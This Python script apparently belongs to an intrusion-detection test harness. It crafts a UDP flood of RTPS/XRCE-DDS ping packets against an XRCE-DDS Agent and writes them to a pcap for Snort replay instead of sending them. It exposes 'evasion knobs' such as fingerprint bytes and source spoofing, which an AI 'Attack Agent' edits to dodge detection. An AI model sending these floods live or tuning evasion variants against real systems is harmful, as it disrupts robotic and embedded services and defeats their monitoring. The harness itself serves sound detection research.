"""xrce-dds-udp-dos — UDP flood attack against the XRCE-DDS Agent.

This is a REAL, mutable attack, structurally equivalent to the one on the physical
testbed (see variacoes/refinamento_xrce-dds-udp-dos.md). It floods the target with
RTPS/XRCE-DDS ping datagrams from a single source, saturating the Agent's UDP port.

Difference from the testbed version — and the ONLY difference: instead of transmitting
the packets on a live socket (which needs raw-socket capture on the IDS, unavailable
in the self-contained harness), it CRAFTS the exact same bytes and writes them to a
pcap at /out/attack.pcap. The harness replays that pcap through the real Snort engine
in read-file mode. The packet contents, the single-source fingerprint, the RTPS magic
and the flood rate are identical to what would go on the wire — so the Attack Agent's
source mutations and image rebuilds are fully exercised.

============================================================================
MUTABLE PARAMETERS — the Attack Agent edits these (via modify_attack_file) to
build evasion variants, then rebuilds the image (rebuild_attack_image):
============================================================================
"""

from __future__ import annotations

import socket
import struct
import sys
from pathlib import Path

# --- MUTABLE PARAMETERS (evasion knobs) -----------------------------------
# H2 (library fingerprint): the RTPS magic + version + vendor id identify the
# microxrcedds_client library. An evasion variant may alter these bytes.
RTPS_MAGIC = b"RTPS"          # protocol fingerprint an IDS keys on: |52 54 50 53|
PROTO_VERSION = b"\x02\x01"   # RTPS 2.1
VENDOR_ID = b"\x01\x0f"       # eProsima / Micro-XRCE vendor id
GUID_PREFIX = bytes.fromhex("0102030405060708090a0b0c")  # 12-byte client GUID
PING_SUBMSG_ID = 0x0B         # XRCE PING submessage id

# H1 (single source): the whole flood comes from one source IP/port. An evasion
# variant may spread the source (spoofing) — see the playbook's H1 catalogue.
SRC_IP = "10.13.37.66"
SRC_PORT = 45000
# --------------------------------------------------------------------------


def _ip_checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    total = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    total = (total >> 16) + (total & 0xFFFF)
    total += total >> 16
    return (~total) & 0xFFFF


def _udp_frame(src_ip: str, dst_ip: str, sport: int, dport: int, payload: bytes) -> bytes:
    eth = b"\x02\x00\x00\x00\x00\x02" + b"\x02\x00\x00\x00\x00\x01" + b"\x08\x00"
    udp_len = 8 + len(payload)
    udp = struct.pack("!HHHH", sport, dport, udp_len, 0) + payload  # csum 0 (valid for IPv4)
    ip_len = 20 + udp_len
    ip = struct.pack("!BBHHHBBH", 0x45, 0, ip_len, 0x1234, 0, 64, 17, 0)
    ip += socket.inet_aton(src_ip) + socket.inet_aton(dst_ip)
    ip = ip[:10] + struct.pack("!H", _ip_checksum(ip)) + ip[12:]
    return eth + ip + udp


def _xrce_ping(seq: int, payload_size: int) -> bytes:
    """One RTPS/XRCE-DDS PING datagram payload of `payload_size` bytes."""
    submsg = bytes([PING_SUBMSG_ID, 0x07]) + struct.pack("<H", 8) + struct.pack("<II", 0, seq)
    body = RTPS_MAGIC + PROTO_VERSION + VENDOR_ID + GUID_PREFIX + submsg
    if len(body) < payload_size:
        body += bytes(payload_size - len(body))  # zero-pad to requested size
    return body[:payload_size]


def _write_pcap(path: Path, frames: list[tuple[int, int, bytes]]) -> None:
    with path.open("wb") as f:
        # Global header: magic, v2.4, DLT_EN10MB (1), big-endian.
        f.write(struct.pack("!IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1))
        for ts_sec, ts_usec, frame in frames:
            f.write(struct.pack("!IIII", ts_sec, ts_usec, len(frame), len(frame)) + frame)


def main() -> int:
    if len(sys.argv) < 3:
        print("usage: attack_udp_dos.py <target_ip> <target_port> [num_packets] [payload_size]",
              file=sys.stderr)
        return 2
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    num_packets = int(sys.argv[3]) if len(sys.argv) > 3 else 80
    payload_size = int(sys.argv[4]) if len(sys.argv) > 4 else 64

    out_dir = Path("/out")
    out_dir.mkdir(parents=True, exist_ok=True)
    pcap_path = out_dir / "attack.pcap"

    # Flood: num_packets datagrams spaced 5 ms apart -> a burst well inside 1 s.
    frames: list[tuple[int, int, bytes]] = []
    for seq in range(num_packets):
        payload = _xrce_ping(seq, payload_size)
        frame = _udp_frame(SRC_IP, target_ip, SRC_PORT, target_port, payload)
        ts_usec = (seq * 5000) % 1_000_000
        ts_sec = (seq * 5000) // 1_000_000
        frames.append((ts_sec, ts_usec, frame))
    _write_pcap(pcap_path, frames)

    print(
        f"xrce-dds-udp-dos: flooded {target_ip}:{target_port} with {num_packets} "
        f"RTPS ping datagrams ({payload_size} B each) from single source {SRC_IP} "
        f"-> wrote {pcap_path}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
